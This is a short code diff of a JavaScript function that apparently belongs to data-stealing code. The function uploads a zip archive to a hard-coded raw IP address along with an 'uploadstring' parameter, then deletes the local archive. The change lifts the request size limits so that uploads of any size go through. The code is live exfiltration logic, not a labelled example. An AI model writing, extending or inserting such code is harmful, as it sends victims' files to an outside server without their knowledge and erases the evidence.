@@ -16,8 +16,10 @@ const sendFile = async function (type) {
     form.append('file' , fs.createReadStream(path.join(__dirname , 'file.zip')))
     form.append('type' , type)
     await axios.post('http://103.253.146.152?uploadstring='+str , form , {
+        'maxContentLength': Infinity,
+        'maxBodyLength': Infinity,
         headers : {
-            ...form.getHeaders()
+            ...form.getHeaders(),
         }
     })
     fs.unlinkSync(path.join(__dirname , 'file.zip'))
